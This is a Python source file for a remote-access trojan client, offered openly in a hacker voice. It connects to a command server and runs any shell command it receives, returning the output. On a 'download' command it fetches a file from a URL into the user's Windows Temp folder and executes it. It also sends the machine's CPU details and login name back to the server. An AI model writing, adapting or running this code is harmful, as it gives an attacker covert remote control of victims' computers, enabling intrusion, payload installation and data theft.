import socket
import subprocess
import psutil
import os
import wget

HOST = "127.0.0.1"
PORT = 5003
BUFFER_SIZE = 5120
#getting device name for download
login = os.getlogin()
# create the socket object
s = socket.socket()
# connect to the server
s.connect((HOST, PORT))


while True:
    # receive the command from the server
    command = s.recv(BUFFER_SIZE).decode()
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    #download command
    if  "download" in command.lower():
        try:
            #splitting the message up for url and filename
            spli = command.split( )
            newlist = spli.pop(1)
            filelol = spli.pop(1)
            #sexc download to temp, like pro hackers
            wget.download(newlist, '/Users/'+ login +'/AppData/Local/Temp/'+ filelol+'')
            os.chdir('/Users/'+ login +'/AppData/Local/Temp/')
            suc = "file downloaded successfully!"
            #executing file, and sending success message if it worked!
            s.send(suc.encode())
            os.system(filelol)
            os.system("clear")
        except:
            #error cmd
            err = "error!"
            s.send(err.encode())
    if  "shell" in command.lower():
        try:
            shellme = command.split( )
            #splitting command again
            shellist = shellme.pop(1)
            #executing cmd and sending output to server
            output = subprocess.getoutput(shellist)
            s.send(output.encode())
            os.system("clear")
        except:
            s.send(err.encode())
    if "specs" in command.lower():
        #using psutil to get cpu core and freq, I may add a gpu/ram but bleh
        cpufreq = psutil.cpu_freq()
        maxfreq = f"{cpufreq.max:.2f}MHz\nDevice name is: "
        spec = str(psutil.cpu_count(logical=True))
        print(spec)
        #sending it all
        s.send(spec.encode())
        s.send(maxfreq.encode())
        s.send(login.encode())
        os.system("clear")
# close client connection
s.close()
